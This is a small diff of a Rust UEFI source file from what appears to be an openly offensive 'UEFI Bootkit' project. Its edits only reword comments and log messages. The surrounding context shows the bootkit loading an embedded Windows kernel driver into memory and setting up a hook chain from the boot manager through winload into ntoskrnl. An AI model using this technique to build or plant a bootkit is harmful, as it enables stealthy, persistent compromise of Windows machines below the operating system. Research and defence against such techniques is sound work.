@@ -50,7 +50,7 @@ fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
     /* Setup a logger with the default settings. The default settings is COM1 port with level filter Info */
     //com_logger::init();
 
-    // Use COM2 port and print Info log
+    // Use COM2 port with level filter Info
     com_logger::builder().base(0x2f8).filter(LevelFilter::Info).setup();
 
     log::info!("### UEFI Bootkit in Rust by memN0ps ###");
@@ -67,7 +67,7 @@ fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
     let mut driver_bytes = include_bytes!("../../target/x86_64-pc-windows-msvc/debug/redlotus.sys").to_vec();
     
     log::info!("[+] Driver Bytes Address: {:#p}", driver_bytes.as_mut_ptr());
-    log::info!("[+] Driver Bytes Len: {:#x}", driver_bytes.len());
+    log::info!("[+] Driver Bytes Length: {:#x}", driver_bytes.len());
 
     let nt_headers = unsafe { get_nt_headers(driver_bytes.as_mut_ptr()).unwrap() };
     log::info!("[+] Driver SizeOfImage: {:#x}", unsafe { (*nt_headers).OptionalHeader.SizeOfImage as u64 });
@@ -80,7 +80,7 @@ fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
         log::info!("[+] Allocated memory pages for the driver at: {:#x}", DRIVER_PHYSICAL_MEMORY);
     }
 
-    // Copy driver
+    /* Copy Windows kernel driver to the allocated memory*/
     unsafe { copy_nonoverlapping(driver_bytes.as_mut_ptr(), DRIVER_PHYSICAL_MEMORY as *mut u8, driver_bytes.len()) };
 
     /* Set up the hook chain from bootmgfw.efi -> windload.efi -> ntoskrnl.exe */
